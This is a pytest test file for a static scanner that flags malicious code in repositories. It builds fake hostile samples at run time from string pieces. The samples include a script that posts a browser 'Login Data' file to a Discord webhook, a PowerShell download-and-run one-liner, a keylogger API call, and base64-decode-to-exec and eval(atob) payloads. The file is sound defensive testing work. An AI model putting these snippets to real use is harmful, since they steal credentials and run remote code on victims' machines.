# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (c) 2026 The Jungle Fruit
"""The scanner on fake repos. Malicious samples are assembled at run time from pieces, so no line of
this file matches a pattern itself (and the repo scans clean)."""
import json

import scanner
from conftest import ROOT


def write(folder, name, text):
    p = folder / name
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text, 'utf-8')
    return p


def kinds(result, level):
    return {f[1] for f in result['findings'] if f[0] == level}


def test_clean_repo_has_no_findings(tmp_path):
    code = tmp_path / 'code'
    write(code, 'main.py', 'def add(a, b):\n    return a + b\n')
    r = scanner.scan(code)
    assert (r['files'], r['high'], r['medium']) == (1, 0, 0)


def test_high_patterns_are_found(tmp_path):
    code = tmp_path / 'code'
    hook = 'https://discord.com/api/' + 'webhooks/123/abc'
    write(code, 'steal.py', f"import requests\nrequests.post('{hook}', data=open('Login' + ' Data').read())\n")
    write(code, 'run.ps1', 'iwr https://example.org/x.ps1 ' + '| ' + 'iex\n')
    write(code, 'keys.py', 'user32.GetAsync' + 'KeyState(1)\n')
    write(code, 'payload.py', 'ex' + 'ec(base64.b64decode(blob))\n')
    r = scanner.scan(code)
    found = kinds(r, 'HIGH')
    assert {'webhook exfiltration', 'download and run', 'keylogger', 'base64/zlib -> exec (Py)'} <= found
    assert 'outbound network' in kinds(r, 'MEDIUM')


def test_official_rust_installer_is_accepted(tmp_path):
    code = tmp_path / 'code'
    write(code, 'ci.sh', "curl --proto '=https' -sSf https://sh.rustup.rs " + '| ' + 'sh -s -- -y\n')
    assert scanner.scan(code)['high'] == 0


def test_binaries_and_skipped_folders(tmp_path):
    code = tmp_path / 'code'
    (code / 'bin').mkdir(parents=True)
    (code / 'bin' / 'tool.exe').write_bytes(b'MZ')
    write(code, 'node_modules/evil/index.js', 'ev' + 'al(atob("eA=="))\n')
    r = scanner.scan(code)
    assert r['binaries'] == ['bin/tool.exe'] and r['high'] == 0


def test_long_high_entropy_line(tmp_path):
    import random
    rnd = random.Random(1)
    alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=!?#%&*'
    write(tmp_path / 'code', 'blob.js', 'var s="' + ''.join(rnd.choice(alphabet) for _ in range(4000)) + '";\n')
    assert scanner.ENTROPY_LABEL in kinds(scanner.scan(tmp_path / 'code'), 'HIGH')


def test_cli_json_and_report(tmp_path, capsys):
    code = tmp_path / 'code'
    write(code, 'a.py', 'import subprocess\nsubprocess.run(["ls"])\n')
    assert scanner.main([str(code), '--json']) == 0
    out = json.loads(capsys.readouterr().out)
    assert out['medium'] == 1 and out['high_detail'] == []
    assert (tmp_path / 'SCAN.md').read_text('utf-8').startswith('# Static scan')


def test_this_repo_scans_clean():
    """The scanner's own regexes must not trip the scanner."""
    r = scanner.scan(ROOT, extra_skip=('library', 'apps'))
    assert r['high'] == 0, [f for f in r['findings'] if f[0] == 'HIGH']
